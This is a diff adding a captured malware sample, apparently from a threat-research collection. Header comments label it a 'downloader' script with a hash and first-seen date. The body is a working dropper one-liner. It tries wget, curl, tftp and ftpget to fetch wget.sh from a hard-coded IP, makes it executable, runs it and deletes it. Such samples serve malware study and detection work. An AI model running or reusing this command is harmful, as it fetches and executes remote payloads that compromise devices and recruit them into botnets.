@@ -1,0 +1,11 @@
+# sha256: b465f935f1b26e049dadbe0836e265607acca552a7b80c2d9c5cee37ced40f78
+# family: downloader
+# kind: script
+# size_bytes: 398
+# first_seen: 2026-06-02 13:35:11.899325 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.246.174/wget.sh; curl -O http://103.77.246.174/wget.sh; chmod 777 wget.sh; sh wget.sh; tftp 103.77.246.174 -c get wget.sh; chmod 777 wget.sh; sh wget.sh; tftp -r wget.sh -g 103.77.246.174; chmod 777 wget.sh; sh wget.sh; ftpget -v -u anonymous -p anonymous -P 21 103.77.246.174 wget.sh wget.sh; sh wget.sh; rm -rf wget.sh*
